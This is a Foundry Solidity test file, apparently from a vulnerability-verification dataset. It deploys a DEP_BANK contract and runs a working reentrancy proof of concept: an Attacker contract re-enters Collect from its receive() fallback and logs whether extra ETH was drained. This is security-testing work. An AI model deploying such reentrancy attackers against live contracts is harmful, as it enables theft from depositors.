// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0xaae1f51cf3339f18b6d3f3bdc75a5facd744b0b8.sol";

contract ReentrancyTest is Test {
    DEP_BANK public bank;
    LogFile public logFile;
    Attacker public attacker;
    
    function setUp() public {
        // Deploy log and bank contracts
        logFile = new LogFile();
        bank = new DEP_BANK();
        
        // Configure bank settings
        bank.SetLogFile(address(logFile));
        bank.SetMinSum(0);
        
        // Create attacker contract and fund it
        attacker = new Attacker(payable(address(bank)));
        vm.deal(address(attacker), 1 ether);
    }

    function testReentrancyAttack() public {
        // Attacker deposits 1 ETH using its own balance
        attacker.deposit();
        
        console.log("--- BEFORE-Trigger Attack ---");
        uint256 initialBankBalance = address(bank).balance;
        uint256 initialAttackerBalance = address(attacker).balance;
        uint256 initialAtkDeposit = bank.balances(address(attacker));
        
        console.log("Bank initial ETH balance: ", initialBankBalance);
        console.log("Attacker initial ETH balance: ", initialAttackerBalance);
        console.log("Attacker initial deposit: ", initialAtkDeposit);
        
        console.log("--- Trigger Attack ---");
        // Execute attack with partial withdrawal
        attacker.attack(0.5 ether);
        
        console.log("--- AFTER-Trigger Attack ---");
        uint256 finalBankBalance = address(bank).balance;
        uint256 finalAttackerBalance = address(attacker).balance;
        uint256 finalAtkDeposit = bank.balances(address(attacker));
        
        console.log("Bank final ETH balance: ", finalBankBalance);
        console.log("Attacker final ETH balance: ", finalAttackerBalance);
        console.log("Attacker final deposit: ", finalAtkDeposit);
        
        // Compute differential changes
        uint256 bankBalanceReduction = initialBankBalance - finalBankBalance;
        uint256 attackerBalanceIncrease = finalAttackerBalance - initialAttackerBalance;
        uint256 depositReduction = initialAtkDeposit - finalAtkDeposit;
        
        console.log("Bank balance reduction:    ", bankBalanceReduction);
        console.log("Attacker balance increase: ", attackerBalanceIncrease);
        console.log("Deposit reduction:         ", depositReduction);
        
        /*
        Vulnerability exists if either:
        1. Actual balance reduction > expected withdrawal (0.5 ether) shows extra ETH stolen
        2. Attacker ETH increase > deposit reduction shows invalid internal accounting
        */
        bool excessWithdrawn = bankBalanceReduction > 0.5 ether;
        bool invalidAccounting = (attackerBalanceIncrease > depositReduction);
        
        // Final vulnerability verdict
        if (excessWithdrawn || invalidAccounting) {
            console.log("Vulnerability Exists: Reentrancy allowed illegal state changes");
        } else {
            console.log("Vulnerability not Exist: No reentrancy evidence");
        }
    }
}

contract Attacker {
    DEP_BANK public bank;
    uint256 public attackCount = 2;

    constructor(address payable _bank) {
        bank = DEP_BANK(_bank);
    }

    function deposit() public {
        // Deposit entire contract balance (1 ETH)
        bank.Deposit{value: address(this).balance}();
    }

    function attack(uint256 amount) public {
        bank.Collect(amount);
    }

    receive() external payable {
        if (attackCount > 0) {
            attackCount--;
            // Launch reentrant attack with half the amount
            bank.Collect(0.4 ether);
        }
    }
}